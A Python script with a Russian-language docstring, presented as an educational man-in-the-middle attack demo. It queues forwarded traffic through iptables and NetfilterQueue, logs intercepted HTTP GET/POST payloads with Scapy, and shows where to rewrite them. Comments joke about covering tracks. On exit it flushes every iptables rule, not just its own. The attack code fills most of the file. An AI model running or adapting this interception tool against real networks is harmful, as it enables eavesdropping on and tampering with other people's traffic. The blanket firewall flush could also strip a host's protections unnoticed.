"""
MITM-Attack-Example

Этот проект демонстрирует атаку методом "Человек посередине" (MITM) с использованием Python.
Скрипт перехватывает и изменяет сетевой трафик между двумя устройствами, предоставляя возможность
прочитать и изменить данные, как настоящий хакер из кино.

Используйте только в образовательных целях и не нарушайте закон! 🫡
Помните: с великой силой приходит великая ответственность. 🙏


Основные компоненты:
1. Перехват пакетов с помощью Scapy.
2. Изменение пакетов с помощью NetfilterQueue.
3. Настройка iptables для перенаправления трафика.

Запуск:
1. Настройте iptables:
   sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
2. Запустите скрипт:
   sudo python3 mitm_attack.py

Остановка:
Прервите выполнение скрипта (Ctrl + C). Скрипт автоматически очистит правила iptables.

Автор: 41yn14
"""

import logging
import os
from scapy.all import *
from netfilterqueue import NetfilterQueue
import subprocess

# Создаём директорию для логов, если её не существует
os.makedirs("logs", exist_ok=True)

# Настройка логирования, чтобы мы выглядели как настоящие профи
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("logs/mitm_attack.log"),
        logging.StreamHandler()
    ]
)

def process_packet(packet):
    try:
        scapy_packet = IP(packet.get_payload())

        if scapy_packet.haslayer(Raw):
            payload = scapy_packet[Raw].load
            if b"GET" in payload or b"POST" in payload:
                logging.info("[*] Перехвачено сообщение")
                # Пример изменения содержимого пакета
                # payload = payload.replace(b"original", b"modified")
                scapy_packet[Raw].load = payload
                # Удаляем контрольные суммы, чтобы сеть нас не раскусила
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum
                packet.set_payload(bytes(scapy_packet))

        packet.accept()
    except Exception as e:
        logging.error(f"Ошибка обработки пакета: {e}. Пакет уничтожен, не палимся, заметаем следы")
        packet.drop()

def setup_iptables():
    try:
        subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"], check=True)
        logging.info("iptables правила успешно настроены. Ворота открыты, добро пожаловать!")
    except subprocess.CalledProcessError as e:
        logging.error(f"🛑 Не удалось настроить iptables: {e}. Отваливаем! ((")
        exit(1)

def flush_iptables():
    try:
        subprocess.run(["sudo", "iptables", "--flush"], check=True)
        logging.info("iptables правила успешно очищены. Следы заметены, можно спать спокойно.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Не удалось очистить iptables: {e}. Похоже, за нами уже выехали! 🚨")

def main():
    setup_iptables()
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    try:
        logging.info("Запуск атаки... Чёрные очки надеты 😎! поехали!🚀")
        queue.run()
    except KeyboardInterrupt:
        logging.info("Атака остановлена пользователем. 💔")
    except Exception as e:
        logging.error(f"Ошибка выполнения: {e}. Кто-то явно помешал нашим планам! 👾")
    finally:
        flush_iptables()

if __name__ == "__main__":
    main()
